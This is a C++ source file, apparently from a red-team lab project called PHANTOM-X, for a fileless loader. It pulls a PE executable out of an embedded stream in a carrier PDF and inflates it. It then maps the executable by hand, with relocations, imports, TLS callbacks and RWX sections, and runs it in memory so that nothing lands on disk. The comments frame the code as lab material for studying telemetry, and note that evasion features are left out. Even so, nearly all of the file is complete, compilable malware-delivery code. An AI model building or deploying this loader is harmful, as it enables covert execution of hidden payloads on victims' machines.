// =============================================================================
// PHANTOM-X :: phase3_fileless/native/px_native_loader.cpp
// =============================================================================
// px_native_loader.exe -- native C++ loader: extract a PE from a carrier PDF
// and execute it in memory.
//
// WHY A NATIVE LOADER ALONGSIDE THE C# ONE
//     The C# loader hands the payload to the CLR, which does the PE mapping
//     for it. This one does the mapping BY HAND: headers, sections, base
//     relocations, import table, section protections. That is a different
//     technique, and a different set of telemetry, so it is worth having
//     both in the lab.
//
// CHAIN
//     carrier.pdf
//       -> locate the /Type /EmbeddedFile stream
//       -> inflate it (FlateDecode, zlib) into memory
//       -> map the PE: headers, sections, relocations, imports, protections
//       -> call the entry point on a new thread
//     The payload never lands on disk.
//
// DELIBERATE OMISSIONS
//     No obfuscation, no packing, no AMSI bypass, no ETW unhooking, no
//     anti-analysis. Plain, observable, measurable.
//
// BUILD
//   MSVC (x64), on the VM if Build Tools are installed:
//     cl /nologo /O2 /W4 /EHsc px_native_loader.cpp /link zlib1.lib
//     (zlib is optional -- see BuildWithoutZlib below)
//
//   MinGW cross-compile from the Kali box (no toolchain needed on the VM):
//     x86_64-w64-mingw32-g++ -O2 -Wall -Wextra -static-libgcc -static-libstdc++
//         -o px_native_loader.exe px_native_loader.cpp
//         /usr/x86_64-w64-mingw32/lib/libz.a -lws2_32
//
//     The static flags matter: without them the binary needs
//     libstdc++-6.dll and libgcc_s_seh-1.dll, which a stock Windows 11
//     machine does not have.
//
// USAGE
//     px_native_loader.exe <carrier.pdf>
//
// BuildWithoutZlib
//     If zlib is unavailable, compile with -DPX_NO_ZLIB. The embedded file
//     must then be stored UNCOMPRESSED (no /FlateDecode on the stream).
//     make_attack_pdf.py --compress / --no-compress selects this.
// =============================================================================

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#include <windows.h>
#include <cstdio>
#include <cstring>
#include <cstdint>
#include <string>
#include <vector>
#include <memory>

#ifndef PX_NO_ZLIB
#include <zlib.h>
#endif

namespace px {

using Byte = unsigned char;

static void logf(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    fflush(stdout);
}

// ---------------------------------------------------------------------------
// file helpers
// ---------------------------------------------------------------------------
static bool read_file(const std::string &path, std::vector<Byte> &out) {
    HANDLE h = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    LARGE_INTEGER li;
    GetFileSizeEx(h, &li);
    if (li.QuadPart <= 0) { CloseHandle(h); return false; }
    out.resize((size_t)li.QuadPart);
    DWORD got = 0;
    BOOL ok = ReadFile(h, out.data(), (DWORD)out.size(), &got, nullptr);
    CloseHandle(h);
    return ok && got == out.size();
}

// ---------------------------------------------------------------------------
// PDF: locate the embedded file
// ---------------------------------------------------------------------------
static size_t find_token(const Byte *hay, size_t hay_len,
                         const char *needle, size_t from) {
    size_t n = strlen(needle);
    if (!n || hay_len < n) return (size_t)-1;
    for (size_t i = from; i + n <= hay_len; ++i)
        if (hay[i] == (Byte)needle[0] && memcmp(hay + i, needle, n) == 0) return i;
    return (size_t)-1;
}

// The dictionary that encloses a stream keyword. A naive "nearest << before
// the keyword" grabs a NESTED dictionary (an EmbeddedFile dict normally
// holds a /Params << ... >> block), so brackets are matched properly.
static long dict_start_for_stream(const Byte *pdf, size_t len, size_t stream_pos) {
    long closes = 0;
    size_t i = stream_pos;
    (void)len;
    while (i >= 2) {
        if (pdf[i - 1] == '>' && pdf[i] == '>') { closes++; i -= 2; continue; }
        if (pdf[i - 1] == '<' && pdf[i] == '<') {
            if (closes == 0) { i -= 2; continue; }
            if (closes == 1) return (long)(i - 1);
            closes--; i -= 2; continue;
        }
        --i;
    }
    return -1;
}

static long dict_end_from_start(const Byte *pdf, size_t len, size_t ds) {
    long depth = 0;
    size_t i = ds;
    while (i + 1 < len) {
        if (pdf[i] == '<' && pdf[i + 1] == '<') { depth++; i += 2; continue; }
        if (pdf[i] == '>' && pdf[i + 1] == '>') {
            depth--; i += 2;
            if (depth == 0) return (long)i;
            continue;
        }
        ++i;
    }
    return -1;
}

static long dict_length(const Byte *pdf, size_t pdf_len,
                        const Byte *dict, size_t dict_len, int depth) {
    static const char key[] = "/Length";
    const size_t klen = sizeof(key) - 1;
    for (size_t i = 0; i + klen <= dict_len; ++i) {
        if (memcmp(dict + i, key, klen) != 0) continue;
        size_t j = i + klen;
        while (j < dict_len && (dict[j] == ' ' || dict[j] == '\r' ||
                                dict[j] == '\n' || dict[j] == '\t')) ++j;
        if (j >= dict_len || !isdigit((unsigned char)dict[j])) continue;
        long first = strtol((const char *)dict + j, nullptr, 10);
        size_t k = j;
        while (k < dict_len && isdigit((unsigned char)dict[k])) ++k;
        while (k < dict_len && (dict[k] == ' ' || dict[k] == '\r' ||
                                dict[k] == '\n' || dict[k] == '\t')) ++k;
        if (k < dict_len && isdigit((unsigned char)dict[k])) {
            size_t m = k;
            while (m < dict_len && isdigit((unsigned char)dict[m])) ++m;
            while (m < dict_len && (dict[m] == ' ' || dict[m] == '\r' ||
                                    dict[m] == '\n' || dict[m] == '\t')) ++m;
            if (m < dict_len && dict[m] == 'R') {
                if (depth > 3) return -1;
                char pat[64];
                snprintf(pat, sizeof(pat), "%ld 0 obj", first);
                long opos = (long)find_token(pdf, pdf_len, pat, 0);
                if (opos < 0) return -1;
                long eop = (long)find_token(pdf, pdf_len, "endobj", (size_t)opos);
                if (eop < 0) return -1;
                return dict_length(pdf, pdf_len, pdf + opos,
                                   (size_t)(eop - opos), depth + 1);
            }
        }
        return first;
    }
    return -1;
}

static bool inflate_buffer(const Byte *in, size_t in_len, size_t hint,
                           std::vector<Byte> &out) {
#ifndef PX_NO_ZLIB
    z_stream zs{};
    size_t cap = hint ? hint : (in_len * 4 + 1024);
    out.assign(cap, 0);
    if (inflateInit(&zs) != Z_OK) return false;
    zs.next_in = (Bytef *)in;
    zs.avail_in = (uInt)in_len;
    for (;;) {
        zs.next_out = out.data() + zs.total_out;
        zs.avail_out = (uInt)(cap - zs.total_out);
        int rc = inflate(&zs, Z_NO_FLUSH);
        if (rc == Z_STREAM_END) break;
        if (rc != Z_OK && rc != Z_BUF_ERROR) { inflateEnd(&zs); return false; }
        if (zs.avail_out == 0) {
            cap *= 2;
            out.resize(cap);
        } else if (rc == Z_BUF_ERROR) {
            inflateEnd(&zs);
            return false;
        }
    }
    out.resize(zs.total_out);
    inflateEnd(&zs);
    return true;
#else
    (void)in; (void)hint;
    out.assign(in, in + in_len);
    return true;
#endif
}

static bool extract_embedded(const Byte *pdf, size_t pdf_len,
                             std::vector<Byte> &out) {
    size_t pos = 0;
    while (pos < pdf_len) {
        long sp = (long)find_token(pdf, pdf_len, "stream", pos);
        if (sp < 0) return false;
        long ds = dict_start_for_stream(pdf, pdf_len, (size_t)sp);
        if (ds < 0) { pos = (size_t)sp + 6; continue; }
        long de = dict_end_from_start(pdf, pdf_len, (size_t)ds);
        if (de < 0) { pos = (size_t)sp + 6; continue; }
        size_t dlen = (size_t)de - (size_t)ds;
        const Byte *dict = pdf + ds;

        bool is_ef = false;
        for (size_t i = 0; i + 13 <= dlen; ++i)
            if (memcmp(dict + i, "/EmbeddedFile", 13) == 0) { is_ef = true; break; }
        if (!is_ef) { pos = (size_t)sp + 6; continue; }

        size_t data_start = (size_t)sp + 6;
        if (data_start + 1 < pdf_len && pdf[data_start] == '\r') ++data_start;
        if (data_start < pdf_len && pdf[data_start] == '\n') ++data_start;

        long length = dict_length(pdf, pdf_len, dict, dlen, 0);
        size_t raw_len;
        if (length > 0 && (size_t)length <= pdf_len - data_start) {
            raw_len = (size_t)length;
        } else {
            long ep = (long)find_token(pdf, pdf_len, "endstream", data_start);
            if (ep < 0) return false;
            raw_len = (size_t)ep - data_start;
            while (raw_len && (pdf[data_start + raw_len - 1] == '\n' ||
                               pdf[data_start + raw_len - 1] == '\r')) --raw_len;
        }

        std::vector<Byte> raw(pdf + data_start, pdf + data_start + raw_len);
        bool flate = false;
        for (size_t i = 0; i + 12 <= dlen; ++i)
            if (memcmp(dict + i, "/FlateDecode", 12) == 0) { flate = true; break; }

        if (flate) {
            if (!inflate_buffer(raw.data(), raw.size(), raw.size() * 3 + 1024, out))
                return false;
            logf("[loader] inflated %zu -> %zu bytes\n", raw.size(), out.size());
        } else {
            out = raw;
            logf("[loader] embedded stream stored uncompressed (%zu bytes)\n", out.size());
        }
        return true;
    }
    return false;
}

// ---------------------------------------------------------------------------
// PE mapping
// ---------------------------------------------------------------------------
static int apply_relocations(Byte *base, IMAGE_NT_HEADERS *nt, ULONGLONG delta) {
    IMAGE_DATA_DIRECTORY *dd =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!dd->VirtualAddress || !dd->Size || !delta) return 0;
    IMAGE_BASE_RELOCATION *rel =
        (IMAGE_BASE_RELOCATION *)(base + dd->VirtualAddress);
    DWORD rva = 0, applied = 0;
    while (rva < dd->Size) {
        DWORD va = rel->VirtualAddress, size = rel->SizeOfBlock;
        if (size < sizeof(IMAGE_BASE_RELOCATION)) break;
        WORD *entries = (WORD *)((Byte *)rel + sizeof(IMAGE_BASE_RELOCATION));
        for (DWORD i = 0; i < (size - sizeof(IMAGE_BASE_RELOCATION)) / 2; ++i) {
            WORD e = entries[i];
            WORD type = (WORD)(e >> 12), off = (WORD)(e & 0x0FFF);
            if (!off) continue;
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG *p = (ULONGLONG *)(base + va + off);
                *p += delta; applied++;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                DWORD *p = (DWORD *)(base + va + off);
                *p += (DWORD)delta; applied++;
            }
        }
        rva += size;
        rel = (IMAGE_BASE_RELOCATION *)((Byte *)rel + size);
    }
    return (int)applied;
}

#ifdef _WIN64
typedef IMAGE_THUNK_DATA64 Thunk;
static const ULONGLONG ORDINAL_FLAG = 0x8000000000000000ULL;
#else
typedef IMAGE_THUNK_DATA32 Thunk;
static const ULONGLONG ORDINAL_FLAG = 0x80000000ULL;
#endif

static int resolve_imports(Byte *base, IMAGE_NT_HEADERS *nt) {
    IMAGE_DATA_DIRECTORY *dd =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!dd->VirtualAddress || !dd->Size) return 0;
    IMAGE_IMPORT_DESCRIPTOR *desc =
        (IMAGE_IMPORT_DESCRIPTOR *)(base + dd->VirtualAddress);
    int resolved = 0;
    for (; desc->Name; ++desc) {
        const char *dllname = (const char *)(base + desc->Name);
        HMODULE mod = LoadLibraryA(dllname);
        if (!mod) {
            logf("[loader]   !! LoadLibrary failed: %s (%lu)\n", dllname,
                 (unsigned long)GetLastError());
            continue;
        }
        Thunk *thunk = (Thunk *)(base + desc->FirstThunk);
        Thunk *orig = desc->OriginalFirstThunk
                          ? (Thunk *)(base + desc->OriginalFirstThunk) : thunk;
        for (;;) {
            FARPROC proc;
            if (!orig->u1.Function) break;
            if (orig->u1.Function & ORDINAL_FLAG) {
                proc = GetProcAddress(mod, (LPSTR)(orig->u1.Function & 0xFFFF));
            } else {
                IMAGE_IMPORT_BY_NAME *ibn =
                    (IMAGE_IMPORT_BY_NAME *)(base + orig->u1.AddressOfData);
                proc = GetProcAddress(mod, (LPCSTR)ibn->Name);
            }
            if (!proc) break;
            thunk->u1.Function = (ULONGLONG)(ULONG_PTR)proc;
            ++thunk; ++orig; ++resolved;
        }
    }
    return resolved;
}

static void call_tls_callbacks(Byte *base, IMAGE_NT_HEADERS *nt) {
    IMAGE_DATA_DIRECTORY *dd =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (!dd->VirtualAddress || !dd->Size) return;
    IMAGE_TLS_DIRECTORY *tls = (IMAGE_TLS_DIRECTORY *)(base + dd->VirtualAddress);
    ULONGLONG *arr = (ULONGLONG *)(base + tls->AddressOfCallBacks);
    if (!arr) return;
    while (*arr) {
        void (*cb)(HMODULE, DWORD, void *) =
            (void (*)(HMODULE, DWORD, void *))(ULONG_PTR)*arr;
        cb((HMODULE)base, DLL_PROCESS_ATTACH, nullptr);
        ++arr;
    }
}

static Byte *map_pe(const Byte *pe, size_t pe_len, void **entry_out) {
    if (pe_len < sizeof(IMAGE_DOS_HEADER)) return nullptr;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)pe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        logf("[loader] not a PE: bad DOS signature\n");
        return nullptr;
    }
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        logf("[loader] not a PE: bad NT signature\n");
        return nullptr;
    }

    DWORD image_base = nt->OptionalHeader.ImageBase;
    DWORD size_of_image = nt->OptionalHeader.SizeOfImage;
    DWORD size_of_headers = nt->OptionalHeader.SizeOfHeaders;
    logf("[loader] PE machine=0x%04x imagebase=0x%08x sizeofimage=0x%x entry=0x%x\n",
         nt->FileHeader.Machine, image_base, size_of_image,
         nt->OptionalHeader.AddressOfEntryPoint);

    Byte *base = (Byte *)VirtualAlloc((LPVOID)(ULONG_PTR)image_base, size_of_image,
                                      MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (base) {
        logf("[loader] mapped at preferred base %p\n", (void *)base);
    } else {
        base = (Byte *)VirtualAlloc(nullptr, size_of_image,
                                    MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        logf("[loader] mapped at arbitrary base %p (relocations required)\n",
             (void *)base);
    }
    if (!base) return nullptr;

    if (size_of_headers > pe_len) size_of_headers = (DWORD)pe_len;
    memcpy(base, pe, size_of_headers);

    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        DWORD va = sec->VirtualAddress, vsize = sec->Misc.VirtualSize;
        DWORD rawsize = sec->SizeOfRawData, praw = sec->PointerToRawData;
        if (rawsize && praw && (size_t)praw + rawsize <= pe_len) {
            memcpy(base + va, pe + praw, rawsize);
            logf("[loader]   section %-8s va=0x%05x raw=0x%05x vsize=0x%05x chars=0x%08x\n",
                 sec->Name, va, rawsize, vsize, sec->Characteristics);
        }
        if (vsize > rawsize)
            memset(base + va + rawsize, 0, vsize - rawsize);
    }

    if ((ULONGLONG)(ULONG_PTR)base != (ULONGLONG)image_base) {
        int n = apply_relocations(base, nt,
                                  (ULONGLONG)(ULONG_PTR)base - image_base);
        logf("[loader] applied %d relocation(s)\n", n);
    }

    int imports = resolve_imports(base, nt);
    logf("[loader] resolved %d import(s)\n", imports);
    if (imports == 0) {
        logf("[loader] no imports resolved; aborting\n");
        VirtualFree(base, 0, MEM_RELEASE);
        return nullptr;
    }

    call_tls_callbacks(base, nt);

    // Section protections. The loop variable MUST be reset: the copy loop
    // above left it at NumberOfSections, which silently skipped this loop
    // and left the image non-executable.
    sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        DWORD prot = PAGE_READWRITE;
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) prot = PAGE_EXECUTE_READWRITE;
        VirtualProtect(base + sec->VirtualAddress, sec->Misc.VirtualSize, prot, nullptr);
    }
    FlushInstructionCache(GetCurrentProcess(), base, size_of_image);

    *entry_out = base + nt->OptionalHeader.AddressOfEntryPoint;
    logf("[loader] entry point at %p\n", *entry_out);
    return base;
}

static DWORD WINAPI run_entry(LPVOID p) {
    void (*fn)(void) = (void (*)(void))p;
    logf("[loader] calling entry point %p\n", p);
    fn();
    return 0;
}

} // namespace px

int main(int argc, char **argv) {
    using namespace px;
    if (argc < 2) {
        printf("usage: px_native_loader.exe <carrier.pdf>\n");
        return 1;
    }
    std::vector<Byte> pdf;
    if (!read_file(argv[1], pdf)) {
        logf("[loader] cannot read %s (%lu)\n", argv[1],
             (unsigned long)GetLastError());
        return 2;
    }
    logf("[loader] pdf size %zu bytes\n", pdf.size());

    std::vector<Byte> payload;
    if (!extract_embedded(pdf.data(), pdf.size(), payload)) {
        logf("[loader] no embedded file found\n");
        return 3;
    }
    logf("[loader] extracted %zu bytes\n", payload.size());

    void *entry = nullptr;
    Byte *mapped = map_pe(payload.data(), payload.size(), &entry);
    if (!mapped) return 4;

    HANDLE th = CreateThread(nullptr, 0, run_entry, entry, 0, nullptr);
    if (!th) {
        logf("[loader] CreateThread failed (%lu)\n",
             (unsigned long)GetLastError());
        return 5;
    }
    logf("[loader] payload running on thread %lu\n",
         (unsigned long)GetThreadId(th));
    WaitForSingleObject(th, INFINITE);
    return 0;
}
